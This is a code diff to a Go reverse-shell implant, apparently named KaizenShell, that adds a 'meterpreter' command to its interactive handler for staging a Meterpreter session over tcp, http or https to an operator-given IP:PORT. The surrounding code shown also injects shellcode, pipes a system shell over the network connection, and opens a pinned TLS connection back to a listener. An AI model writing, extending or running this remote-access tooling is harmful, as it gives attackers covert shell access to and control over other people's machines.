@@ -12,6 +12,7 @@ import (
 	"strings"
 
 	"github.com/JohnAntonusMaximus/KaizenShell/shell"
+	"github.com/johnantonusmaximus/KaizenShell/meterpreter"
 )
 
 const (
@@ -25,6 +26,7 @@ var (
 	fingerPrint   string
 )
 
+// InteractiveShell allows you to pass options to escalate the shell type
 func InteractiveShell(conn net.Conn) {
 	var (
 		exit    bool           = false
@@ -39,6 +41,17 @@ func InteractiveShell(conn net.Conn) {
 		if len(command) > 1 {
 			argv := strings.Split(command, " ")
 			switch argv[0] {
+			case "meterpreter":
+				if len(argv) > 2 {
+					transport := argv[1]
+					address := argv[2]
+					ok, err := meterpreter.Meterpreter(transport, address)
+					if !ok {
+						conn.Write([]byte(err.Error() + "\n"))
+					}
+				} else {
+					conn.Write([]byte("Usage: meterpreter [tcp|http|https] IP:PORT\n"))
+				}
 			case "inject":
 				if len(argv) > 1 {
 					shell.InjectShellCode(argv[1])
@@ -73,6 +86,7 @@ func CheckKeyPin(conn *tls.Conn, fingerprint []byte) (bool, error) {
 	return valid, nil
 }
 
+// RunShell gets and starts a shell from package shell
 func RunShell(conn net.Conn) {
 	var cmd *exec.Cmd = shell.GetShell()
 	cmd.Stdout = conn
@@ -81,6 +95,7 @@ func RunShell(conn net.Conn) {
 	cmd.Run()
 }
 
+// Reverse creates a tcp connection to the listener
 func Reverse(connectString string, fingerprint []byte) {
 	var (
 		conn *tls.Conn
